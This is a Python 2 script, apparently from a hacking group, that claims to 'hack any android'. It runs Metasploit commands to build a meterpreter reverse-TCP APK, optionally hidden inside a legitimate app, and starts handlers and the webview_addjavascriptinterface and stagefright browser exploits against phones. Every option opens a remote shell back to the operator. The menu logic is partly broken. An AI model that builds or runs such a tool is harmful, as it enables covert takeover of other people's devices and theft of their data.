# -*- coding: utf-8 -*-
#!/usr/bin/python
banner = '''





███████╗ ██████╗  █████╗ ██╗   ██╗██╗      ██████╗ ██╗   ██╗███████╗      ███████╗ ██████╗ ██╗   ██╗████████╗██╗  ██╗
██╔════╝██╔═══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██║   ██║██╔════╝      ██╔════╝██╔═══██╗██║   ██║╚══██╔══╝██║  ██║
███████╗██║   ██║███████║ ╚████╔╝ ██║     ██║   ██║██║   ██║███████╗█████╗███████╗██║   ██║██║   ██║   ██║   ███████║
╚════██║██║▄▄ ██║██╔══██║  ╚██╔╝  ██║     ██║   ██║██║   ██║╚════██║╚════╝╚════██║██║   ██║██║   ██║   ██║   ██╔══██║
███████║╚██████╔╝██║  ██║   ██║   ███████╗╚██████╔╝╚██████╔╝███████║      ███████║╚██████╔╝╚██████╔╝   ██║   ██║  ██║
╚══════╝ ╚══▀▀═╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝      ╚══════╝ ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═╝                                                                                                                 
                                                                                                                                 

     
'''
print banner
import os
import sys
import urllib2
import re
import time
import httplib
import random


# Color Console
W  = '\033[0m'  # white (default)
R  = '\033[31m' # red
G  = '\033[1;32m' # green bold
O  = '\033[33m' # orange
B  = '\033[34m' # blue
P  = '\033[35m' # purple
C  = '\033[36m' # cyan
GR = '\033[37m' # gray

#Bad HTTP Responses 
BAD_RESP = [400,401,404]

def main(path):
    print "[+] Testing:",host.split("/",1)[1]+path
    try:
        h = httplib.HTTP(host.split("/",1)[0])
        h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
        h.putheader("Host", host.split("/",1)[0])
        h.endheaders()
        resp, reason, headers = h.getreply()
        return resp, reason, headers.get("Server")
    except(), msg: 
        print "Error Occurred:",msg
        pass

def timer():
    now = time.localtime(time.time())
    return time.asctime(now)

def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush() # defeat buffering
        time.sleep(8./90)

print G+"\n\t          Andriod ! create payload for hack any android"
slowprint (R+"\n\t                 .:SQaYlOuS SoUtH:."+O+"Team Moroccan Experience"+O)
print W+"                  https://www.facebook.com/TeamMoroccanExperience/"
print ('\033[96m[1].\033[97mhack android with payload 	APK ')
print ('\033[96m[2]..\033[97mhack android with url ')
print ('\033[96m[3]...\033[97mMerge and encrypt Payload Clean ')
choose = raw_input('\033[91m \n [+]>Choose Tools <3 <[+] >>>>:')
if choose =='1':
 LHOST = raw_input ('\033[95mEnter your IP :')
 LPORT = raw_input ('\033[95mEnter your Port :')
 os.system('msfvenom -p android/meterpreter/reverse_tcp LHOST='+LHOST+' '+'LPORT='+LPORT+' -o /root/Desktop/Giants.apk')
 os.system(' msfconsole -x "use multi/handler;set payload android/meterpreter/reverse_tcp;set srvhost '+LHOST+';set LHOST '+LHOST+';set LPORT '+LPORT+'"')
if choose =='2':
 lip=raw_input('Enter Your IP :')
 liport=raw_input('Enter Your port :')
 os.system('msfconsole -x "use exploit/android/browser/webview_addjavascriptinterface;set srvhost '+lip+';set LHOST '+lip+';set LPORT '+liport+';exploit -j"')
if choose =='3':
 lip=raw_input('\033[96mEnter Your IP :')
 liport=raw_input('\033[96mEnter Your port :')
 os.system ('msfconsole -x "use exploit/android/browser/stagefright_mp4_tx3g_64bit;set srvhost '+lip+';set LHOST '+lip+';set LPORT '+liport+';exploit -j"')
if choose=='4':
 LHOST = raw_input ('\033[95mEnter your IP :')
 LPORT = raw_input ('\033[95mEnter your Port :')
 pay=raw_input('\033[96mEnter Your APK Origin: ')
 pay2=raw_input('Enter Your name Payload:')
 os.system ('msfvenom -x "/root/Desktop/Android/'+pay+' -p android/meterpreter/reverse_tcp LHOST='+LHOST+' '+'LPORT='+LPORT+' -o /root/Desktop/'+pay2+' -j"') 
else:
 print ('\033[93m \bSahT Si L hAckERZ jhhhhh :')
